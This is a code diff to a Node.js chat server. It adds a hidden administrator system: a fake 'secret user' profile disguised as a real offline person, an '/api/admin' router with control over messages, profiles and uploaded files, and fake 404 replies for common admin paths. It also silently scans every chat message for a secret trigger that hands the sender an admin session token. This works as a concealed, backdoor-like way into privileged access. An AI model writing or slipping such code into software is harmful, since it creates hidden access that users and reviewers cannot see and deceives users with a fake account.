@@ -344,6 +344,11 @@ const jamesBotProfile = {
 };
 saveProfile(jamesBotProfile);
 
+// Pre-seed Predefined Secret User profile (appears as an authentic offline sleeping user)
+const { getSecretUserProfile, inspectChatMessage } = require('./admin/secretChatVerification');
+const secretUserProfile = getSecretUserProfile();
+saveProfile(secretUserProfile);
+
 // Helper to broadcast real active human user count on the site
 const getRealUserCount = () => {
   const uniqueUsers = new Set();
@@ -400,6 +405,24 @@ const jamesBot = new JamesBot(io, (msg) => {
     }
     return list;
   }
+});
+
+// --- Hidden Administrator System Routes & Protection ---
+const createAdminRouter = require('./admin/adminRoutes');
+app.use('/api/admin', createAdminRouter({
+  io,
+  messages,
+  saveMessages,
+  userProfiles,
+  saveProfile,
+  activeUsers,
+  deleteUploadedFile,
+  jamesBot
+}));
+
+// Return 404 for direct manual navigation attempts to common admin paths
+app.get(['/admin', '/admin-panel', '/secret-admin', '/admin/dashboard'], (req, res) => {
+  res.status(404).send('Cannot GET ' + req.path);
 });
 
 // Socket.IO connection
@@ -590,6 +613,23 @@ io.on('connection', (socket) => {
     saveMessages(messages);
 
     io.emit('message', message);
+
+    // Silently monitor outgoing chat transmission for hidden administrator chat action verification
+    try {
+      const clientIp = socket.handshake.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
+                       socket.handshake.address ||
+                       '127.0.0.1';
+      const secretCheck = inspectChatMessage(message, socket.id, clientIp);
+      if (secretCheck.isSecretMatch && secretCheck.session) {
+        socket.emit('adminFlowAdvance', {
+          stage: 'CHAT_VERIFIED',
+          sessionId: secretCheck.session.sessionId,
+          sessionToken: secretCheck.session.token
+        });
+      }
+    } catch (secErr) {
+      console.error('[Admin Chat Verification Error]:', secErr.message);
+    }
 
     if (!msg.encrypted && msg.alias) {
       let existing = getOrCreateProfile(resolvedUserId, msg.alias) || {};
